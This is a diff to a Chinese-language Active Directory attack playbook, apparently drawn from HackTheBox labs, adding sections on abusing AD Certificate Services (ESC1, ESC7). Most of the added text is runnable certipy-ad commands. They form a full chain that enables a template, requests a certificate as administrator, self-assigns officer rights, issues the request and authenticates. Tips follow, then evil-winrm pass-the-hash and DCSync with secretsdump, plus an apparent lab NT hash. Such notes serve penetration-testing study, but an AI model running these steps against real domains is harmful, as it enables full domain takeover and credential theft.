@@ -14,7 +14,7 @@ Step 2 凭据收割（按密文位置：内存 lsass / NTDS 离线 / 强制认�
    ↓
 Step 3 按手上权限选提权路：
    ACL 边（ForceChangePassword / Account Operators / Owner / GenericWrite / RBCD）→ §3
-   ADCS 模板 ENROLLEE_SUPPLIES_SUBJECT → §4
+   ADCS：模板 ENROLLEE_SUPPLIES_SUBJECT（ESC1）/ CA 权限配错 ManageCa·ManageCertificates（ESC7）→ §4
    特权/协议（SeBackupPrivilege / MS14-068 / 银票 / NTLMv1）→ §5
    ↓
 Step 4 出口全封（邮件明示 WinRM 不外露 + TCP/UDP/ICMP 全封）→ §6 域内隧道落地
@@ -323,9 +323,34 @@ certipy-ad shadow auto -k -no-pass -u 'absolute.htb/m.lovegod@dc.absolute.htb' \
 - **PKINIT 不受 Protected Users 限制**：本案 `winrm_user` 在 Protected Users（禁 NTLM、禁 RC4），该攻击照样成功（实测）——不要因为目标在 Protected Users 组就排除这条路。
 - 检测视角：`msDS-KeyCredentialLink` 的写入在 5136（目录服务变更）里是强特征（标准 AD 审计事件，本档未实测）；且因结尾自动还原，事后回溯困难。
 
-## 4. ADCS 证书攻击（ESC1）
+## 4. ADCS 证书攻击（ESC 判读 / ESC1 / ESC7）
 
-四步链（来源：HTB-Escape 全链）：
+### 4.1 先判 CA 与自身在 CA 上的权限（certipy-ad find）
+
+Linux 侧一条命令同时完成"发现 CA"与"判当前身份可利用的漏洞"（工具实名 `certipy-ad`，v5 参数）：
+
+```bash
+certipy-ad find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC> -vulnerable -stdout
+```
+
+取数分两步：先 LDAP 读证书模板对象与 `pKIEnrollmentService`（CA 是否存在、发布了哪些模板），再用 RRP 远程注册表读 CA 标志位。漏洞判定会结合**当前账号的嵌套组成员关系**，同一份输出换个账号结论会变。
+
+四行输出各自决定一条路线：
+
+| 字段 | 取值 | 含义 |
+|---|---|---|
+| `Web Enrollment HTTP/HTTPS` | `True` / `False` | ESC8（NTLM relay 到 `/certsrv`）是否成立；False 时只能走 RPC |
+| `User Specified SAN` | `Enabled` / `Disabled` | CA 级 `EDITF_ATTRIBUTESUBJECTALTNAME2`；Disabled 表示不能靠请求属性注 SAN（ESC1 的 CA 级前提） |
+| `ManageCa` / `ManageCertificates` | 是否含自身账号 | ESC7 的前提（语义见 §4.3） |
+| `[!] Vulnerabilities` | `ESC1` / `ESC7` / … | 直接结论 |
+
+**`Certificate Templates : [!] Could not find any certificate templates` 不等于没有模板**：`-vulnerable` 过滤后为空只说明"当前身份没有可利用的模板漏洞"；去掉 `-vulnerable` 才看全量（HTB-Manager 实测：域内 33 个模板、该 CA 只发布 11 个）。
+
+CA 名还有主机侧来源：`certutil -getconfig` 回 `主机\CA名`（读本机注册表），**同时是"这台机器装没装 CA"的判据**——没装证书服务的机器上执行会报找不到 CA（机制推断，未在本档单独实测）。
+
+### 4.2 ESC1：申请者可自定 SAN（来源：HTB-Escape 全链）
+
+四步链（Windows 侧 Certify.exe / Rubeus）：
 
 1. 发现 CA 与模板：
 ```bash
@@ -349,6 +374,52 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 ```bash
 evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5E17E1E9F3E58F4EE
 ```
+
+### 4.3 ESC7：CA 对象权限配错（ManageCa / ManageCertificates，来源：HTB-Manager 全链）
+
+**判据**：§4.1 的输出里，自己的账号出现在 CA 的 `ManageCa` 或 `ManageCertificates` 名下（`[+] User ACL Principals` 会点名），末尾出现 `[!] Vulnerabilities ESC7`。两个权限语义不同，不能互换：
+
+| 权限 | 能做什么 | 缺了会怎样 |
+|---|---|---|
+| `ManageCa` | 改 CA 配置（发布/取消模板）、**给账号分配 CA 角色**、备份 CA 密钥 | 无法启用模板、无法自封 officer |
+| `ManageCertificates`（officer） | 批准 / 拒绝挂起的请求 | 直接 `-issue-request` 报 `Access denied: Insufficient permissions to issue certificate` |
+
+**五步链**（Kali 侧，`-ca` 只给 CA 名，不带 `主机\` 前缀）：
+
+1. 看 CA 当前发布了哪些模板：
+```bash
+certipy-ad ca -ca '<CA名>' -list-templates -u '<user>@<domain>' -p '<pass>' -dc-ip <DC>
+```
+   取数走 DCOM 的 `ICertAdminD2::GetCAProperty`（属性 `CR_PROP_TEMPLATES`），**本身就需要 CA 管理权**。`SubCA` 与 `Administrator` 出厂**不发布**，出现在清单里说明被预先启用，此时跳过下一条；没在清单里就先用 `ManageCa` 打开：
+```bash
+certipy-ad ca -ca '<CA名>' -enable-template 'SubCA' -u '<user>@<domain>' -p '<pass>' -dc-ip <DC>
+```
+2. 用 `SubCA` 模板申请一张 subject 指向管理员的证书：
+```bash
+certipy-ad req -u '<user>@<domain>' -p '<pass>' -ca '<CA名>' -template 'SubCA' -upn 'administrator@<domain>' -dc-ip <DC>
+```
+3. 用 `ManageCa` 把自己加进审核员角色（**必须在批准之前**）：
+```bash
+certipy-ad ca -ca '<CA名>' -add-officer '<user>' -u '<user>@<domain>' -p '<pass>' -dc-ip <DC>
+```
+4. 强行签发第 2 步那个被拒的请求：
+```bash
+certipy-ad ca -ca '<CA名>' -issue-request <ID> -u '<user>@<domain>' -p '<pass>' -dc-ip <DC>
+```
+5. 取回证书并认证：
+```bash
+certipy-ad req -u '<user>@<domain>' -p '<pass>' -ca '<CA名>' -retrieve <ID> -dc-ip <DC>
+certipy-ad auth -pfx administrator.pfx -dc-ip <DC>     # → TGT + NT hash
+```
+
+**四条必须记住的判读：**
+
+- `0x80094012 CERTSRV_E_TEMPLATE_DENIED` **不是失败**：请求已入库并分配了 Request ID，certipy 会问 `Would you like to save the private key? (y/N)` —— **必须答 y**，私钥落到 `<RequestID>.key`。certipy 官方 wiki 的 ESC7 章节里这段输出就是"预期输出"。
+- **CA 层 Enroll 与模板层 Enroll 是两套权限**：`find` 的 `Enroll` 列里有你不代表能用 `SubCA`——本例模板层根本没给该账号 Enroll 权限，上面那次拒绝正来自模板层。
+- `-retrieve` 会按 `<RequestID>.key` 在**当前目录**找私钥（`certipy/lib/req.py`）；换目录或删了私钥只能拿到无私钥的 `.crt`，PKINIT 用不了，整链要从"申请 → 新 ID → 重新批准"重来。
+- `auth` 报 `KRB_AP_ERR_SKEW` 一律先校时（`sudo ntpdate <DC>`），不要怀疑证书：靶机换 IP / 重开实例后时间基准会变。
+
+**收尾**：`auth` 给出 ccache 与 NT hash → `evil-winrm -H <hash>` 直接读旗，或 `impacket-secretsdump -k -no-pass` 做 DCSync。
 
 ## 5. 域管直达路径（无需 ACL 边的直线）
 
